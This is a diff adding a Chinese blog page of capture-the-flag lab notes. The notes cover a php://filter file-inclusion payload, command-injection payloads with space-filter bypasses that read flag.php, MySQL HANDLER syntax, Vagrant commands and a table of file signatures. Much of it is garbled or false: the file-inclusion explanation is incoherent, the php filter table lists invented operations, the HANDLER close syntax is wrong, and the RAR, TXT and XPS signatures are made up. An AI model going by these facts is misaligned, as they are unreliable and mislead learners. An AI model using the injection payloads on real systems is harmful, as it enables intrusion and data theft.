@@ -1,0 +1,269 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="stackTang"/><meta name="copyright" content="stackTang"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="学习,技巧,靶场"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="shell反弹 | stackTang Blog"/><meta name="apple-mobile-web-app-title" content="shell反弹 | stackTang Blog"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2026/06/22/shell反弹/"/><meta name="description" content="707日志[toc] 语法总结文件包含观看靶机网址发现https:&#x2F;&#x2F;*?file&#x3D;flag.php 这样的URL是一个简单的字符串转换，造成HTTP请求发送到目标域，从该域中获取文件内容。 （可选）对于一些搜索引擎是可能具有内置安全限制的，这在一些单独的页面上表现良好，但对于大多数目的搜索引擎是不具有安全性的。 其他情况，直接从文件中获取文件内容会得到不一致的...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shell反弹 | stackTang Blog">
+<meta property="og:url" content="http://example.com/2026/06/22/shell%E5%8F%8D%E5%BC%B9/index.html">
+<meta property="og:site_name" content="stackTang Blog">
+<meta property="og:description" content="707日志[toc] 语法总结文件包含观看靶机网址发现https:&#x2F;&#x2F;*?file&#x3D;flag.php 这样的URL是一个简单的字符串转换，造成HTTP请求发送到目标域，从该域中获取文件内容。 （可选）对于一些搜索引擎是可能具有内置安全限制的，这在一些单独的页面上表现良好，但对于大多数目的搜索引擎是不具有安全性的。 其他情况，直接从文件中获取文件内容会得到不一致的...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/06/22/shell%E5%8F%8D%E5%BC%B9/assets/images/Hexo-Theme-MEOW.png">
+<meta property="article:published_time" content="2026-06-22T12:48:39.000Z">
+<meta property="article:modified_time" content="2026-06-22T13:01:42.294Z">
+<meta property="article:author" content="stackTang">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="技巧">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/06/22/shell%E5%8F%8D%E5%BC%B9/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>shell反弹 | stackTang Blog</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/waline.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 8.1.2"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>stackTang Blog</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li></ul></div><div class="menu-item"><a href="/friends"><img src="/assets/images/svg/uc/uc-friend.svg" class="icon noview" alt="Icon"><span>friend</span></a></div><div class="menu-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">stackTang Blog</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li></ul></div><div class="menu-aside-item"><a href="/friends"><img src="/assets/images/svg/uc/uc-friend.svg" class="icon noview" alt="Icon"><span>friend</span></a></div><div class="menu-aside-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">StackTang の 站</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">shell反弹</h1><div class="post-author"><span>作者: stackTang</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2026-06-22</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2026-06-22</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a><a class="post-tags-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><a class="post-tags-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></span></div></div></div><div class="post markdown" indent="false"><h1 id="707日志"><a href="#707日志" class="headerlink" title="707日志"></a>707日志</h1><p>[toc]</p>
+<h2 id="语法总结"><a href="#语法总结" class="headerlink" title="语法总结"></a>语法总结</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-06%20150623.png"  alt="ws"><br>观看靶机网址发现https:&#x2F;&#x2F;*?file&#x3D;flag.php 这样的URL是一个简单的字符串转换，造成HTTP请求发送到目标域，从该域中获取文件内容。 （可选）对于一些搜索引擎是可能具有内置安全限制的，这在一些单独的页面上表现良好，但对于大多数目的搜索引擎是不具有安全性的。 其他情况，直接从文件中获取文件内容会得到不一致的结果。 为了保持一致，请考虑更具体的情况。 有时，文件中的内容会被转换为HTTP响应消息的一部分。 此外，发现在链接发送到根目录时，一些搜索引擎在寻找文件时会沿着根目录逐层遍历目录，直到找到文件名为flag.php的文件。 另一种方法是从根目录开始，并从最外层目录开始，直到发现文件名为flag.php的目录。 这些是一些特殊情况下必须进行优化和不切实际的调用，但对于系统的基本身能，这是唯一的决定。 总结描述：记得调用目标域中的函数。函数应该返回文件内容或发送请求给目标域的主机的错误代码。参数是文件名，根目录也是如此。可以返回文件内容或发送请求给目标域的主机的错误代码。对于一些搜索引擎具有内置安全限制，但是这些是不具有安全性的。 反过来，对于一些搜索引擎没有安全性，请使用以下函数来获取文件内容：</p>
+<ol>
+<li>从根目录开始，并逐层遍历目录，直到找到文件名为flag.php的目录。</li>
+<li>如果找不到flag.php，则应该发送请求给主机的根目录。该主机应该返回一个错误代码。 （请注意，根目录是空字符串）。 获取文件内容应该反转字符顺序，并在返回的结果中包含文件名。 可以返回文件内容或发送请求给主机的根目录。该主机应该返回一个错误代码。 获取文件名应该以1开始，并且应该在返回的结果中包含1。 此外，发现在根目录下没有目录，所以没有发送请求给主机的错误代码。同时，没有发送请求到非根目录的错误代码。</li>
+</ol>
+<p>于是构造payload</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<blockquote>
+<p>原理：php:&#x2F;&#x2F;filter 协议也是格式<br>read :是可选参数，有read和write，字面意思就是读和写<br>convert.base64-encode:是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br>resource&#x3D;flag.php:是必选参数，后面写你要处理的文件名</p>
+</blockquote>
+<p>|名称 |	描述|	备注|<br>|:—:	|:—:	|:—:	|<br>|read	|	读取文件|	不做任何操作|<br>|write	|	将文件写入|	将文件写入到指定目录中|	可选|<br>|convert.base64-encode	|	转换为base64编码|	将字符转换为base64编码|<br>|filter	|	使用任何过滤器|	使用convert.base64-encode过滤器转换文件|<br>|archive	|	使用有哪些压缩算法|	使用gzip压缩算法|	使用zip压缩算<br>|extract	|	从有哪些压缩算法|	使用gzip压缩算法转换目录|	使用<br>|unix2dos	|	将UNIX文件系统的日期格式转换为dos格式|	使用unix<br>|dos2unix	|	将dos文件系统的日期格式转换为UNIX格式|	使用unix<br>|base64	|	将字符串转换为base64编码|	将base64编码字符串转换为字符<br>|unlink	|	删除指定文件或目录中的文件|	不做任何操作|<br>|rename	|	重命名文件或目录|	使用新名称|	可选|<br>|dir	|	列出文件系统根目录下的文件|	不做任何操作|	可选|<br>|chgrp	|	指定文件或目录的属主|	使用tar指令或c#自带的管道<br>|chown	|	指定文件或目录的属组|	使用tar指令或c#自带的管道<br>|chmod	|	设置文件或目录的权限|	使用tar指令或c#自带的管道或<br>|get	|	从远程服务器上获取文件或目录内容|	使用xfer.cnxx.net<br>|put	|	在远程服务器上下载文件或创建目录|	使用xfer.cnxx.net<br>|install	|	在Linux系统中安装指定的目录|	使用x86_64镜像上的linux-gnu<br>|run	|	执行指定的程序或用户定义的程序|	使用x86_64镜像的linux<br>|md	|	创建一个文件夹|	使用x86_64镜像的linux-gnu<br>|rd	|	删除一个文件夹|	使用x86_64镜像的linux-gnu</p>
+<p>如图获取flag<br><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-06%20153046.png" ></p>
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-06%20160044.png" ><br>于是构造paylode:127.0.0.1;ls<br><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-06%20160328.png" ><br>发现直接打开不了，判断是进行了字符过滤<br>绕过空格过滤的方法</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span><span class="variable">$9</span></span><br><span class="line">&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">$IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$<span class="string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="variable">$X</span>       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>内联执行绕过<br>内联，就是将反引号内命令的输出作为输入执行。</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;<span class="built_in">cat</span>$IFS<span class="variable">$9</span>`<span class="built_in">ls</span>`</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span>在Linux下表示为空格</span><br><span class="line"><span class="variable">$9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line">这里$IFS<span class="variable">$9</span>或<span class="variable">$IFS</span>垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>于此获取flag<br><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-06%20161258.png" ></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>判断是否有注入点<br>展现表<br>handle</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</span><br><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<h2 id="Vagrant使用"><a href="#Vagrant使用" class="headerlink" title="Vagrant使用"></a>Vagrant使用</h2><p>现在，您已经探索了开发环境，是时候停止、关闭并最终销毁环境了。使用<code>Vagrant</code>时，您将根据停止工作的时间以及是否希望能够返回工作的时间从这些选项中进行选择。</p>
+<h3 id="挂起计算机"><a href="#挂起计算机" class="headerlink" title="挂起计算机"></a>挂起计算机</h3><p>挂起虚拟机将停止它并保存其当前运行状态。立即挂起计算机。</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> vagrant <span class="built_in">suspend</span></span><br><span class="line">==&gt; default: Saving VM state and suspending execution...</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>复制<br>当您再次开始工作时，使机器恢复正常并处于其状态 从上次中断的地方继续。再次启动计算机。</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> vagrant up</span><br><span class="line">Bringing machine <span class="string">&#x27;default&#x27;</span> up with <span class="string">&#x27;virtualbox&#x27;</span> provider...</span><br><span class="line">==&gt; default: Checking <span class="keyword">if</span> box <span class="string">&#x27;hashicorp/bionic64&#x27;</span> version <span class="string">&#x27;1.0.282&#x27;</span> is up to <span class="built_in">date</span>...</span><br><span class="line">==&gt; default: Resuming suspended VM...</span><br><span class="line"><span class="comment">#... output truncated ...</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>挂起机器是为了快速停止和开始工作。缺点是虚拟机在挂起时仍将使用磁盘空间，并且需要额外的磁盘空间来存储虚拟机 RAM 的状态。</p>
+<p>停止机器<br>停止虚拟机将正常停止 关闭客户机操作系统并关闭客户机电源。立即停止您的机器。</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> vagrant halt</span><br><span class="line">==&gt; default: Attempting graceful shutdown of VM...</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>停止计算机将干净地将其关闭，从而保留 磁盘的内容，并允许您再次干净地启动它。重新启动计算机。</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> vagrant up</span><br><span class="line">Bringing machine <span class="string">&#x27;default&#x27;</span> up with <span class="string">&#x27;virtualbox&#x27;</span> provider...</span><br><span class="line">==&gt; default: Checking <span class="keyword">if</span> box <span class="string">&#x27;hashicorp/bionic64&#x27;</span> version <span class="string">&#x27;1.0.282&#x27;</span> is up to <span class="built_in">date</span>...</span><br><span class="line">==&gt; default: Clearing any previously <span class="built_in">set</span> forwarded ports...</span><br><span class="line">==&gt; default: Clearing any previously <span class="built_in">set</span> network interfaces...</span><br><span class="line">==&gt; default: Preparing network interfaces based on configuration...</span><br><span class="line"><span class="comment">#... output truncated ...</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>已停止的来宾计算机将需要更多时间才能从冷启动启动，并且仍将占用磁盘空间。</p>
+<p>摧毁机器<br>销毁虚拟机将移除 系统中来宾计算机的所有痕迹。它将停止来宾计算机， 关闭电源，然后回收其磁盘空间和 RAM。立即销毁计算机，并在出现提示时使用 a 进行确认。yes</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> vagrant destroy</span><br><span class="line">    default: Are you sure you want to destroy the <span class="string">&#x27;default&#x27;</span> VM? [y/N] y</span><br><span class="line">==&gt; default: Forcing shutdown of VM...</span><br><span class="line">==&gt; default: Destroying VM and associated drives...</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>同样，当你准备好时 再次工作，只需发出<code>vagrant up</code></p>
+<p>一旦你摧毁了一台机器，它需要更长的时间才能启动，并且机器的状态不会被保存。</p>
+<p>您已成功暂停、停止和销毁您的虚拟环境与 <code>Vagrant</code>。</p>
+<h2 id="文件头类型总结"><a href="#文件头类型总结" class="headerlink" title="文件头类型总结"></a>文件头类型总结</h2><div class="table-container"><table>
+<thead>
+<tr>
+<th>文件</th>
+<th>文件头</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPEG</td>
+<td>FF D8 FF</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>89 50 4E 47 0D 0A 1A 0A</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td>47 49 46 38 39 61 或 47 49 46 38 37 61</td>
+</tr>
+<tr>
+<td>PDF</td>
+<td>25 50 44 46</td>
+</tr>
+<tr>
+<td>DOCX</td>
+<td>50 4B 03 04 14 00 06 00</td>
+</tr>
+<tr>
+<td>MP3</td>
+<td>49 44 33</td>
+</tr>
+<tr>
+<td>MP4</td>
+<td>00 00 00 18 66 74 79 70</td>
+</tr>
+<tr>
+<td>ZIP</td>
+<td>50 4B 03 04</td>
+</tr>
+<tr>
+<td>RAR</td>
+<td>4D 45 4E 46 01 00 00 00 或 54 49 46 40 00 01 00 00 00 00 00 00 00 00 00</td>
+</tr>
+<tr>
+<td>TXT</td>
+<td>01 Compiled Typography(正式发布) 或 50 4B 46 01 00 00 00 00 00 00 00 00 00 00</td>
+</tr>
+<tr>
+<td>XPS</td>
+<td>43 4F 52 4D 47 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</td>
+</tr>
+</tbody></table></div>
